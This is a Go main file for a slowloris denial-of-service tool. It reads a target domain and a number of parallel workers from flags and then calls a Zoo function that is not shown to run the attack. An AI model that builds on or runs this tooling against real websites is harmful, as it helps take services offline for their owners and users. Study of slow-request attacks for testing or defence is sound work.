package main

import (
	"flag"
	"fmt"
)

func main() {
	var domain *string = flag.String("domain", "", "Domain to perform attack")
	var count *int64 = flag.Int64("count", int64(10), "Number of parallel workers")

	flag.Parse()
	if !flag.Parsed() {
		Help()
		return
	}

	if *domain == "" {
		Help()
		return
	}

	sanitized, err := SanitizeDomain(*domain)
	if err != nil {
		fmt.Println(err)
	}

	fmt.Println("slowloris...")
	fmt.Printf("creating zoo of %d loris for %s\n", *count, sanitized)
	if err := Zoo(Config{
		URL:   sanitized,
		Count: *count,
	}); err != nil {
		fmt.Println(err)
	}

	return
}
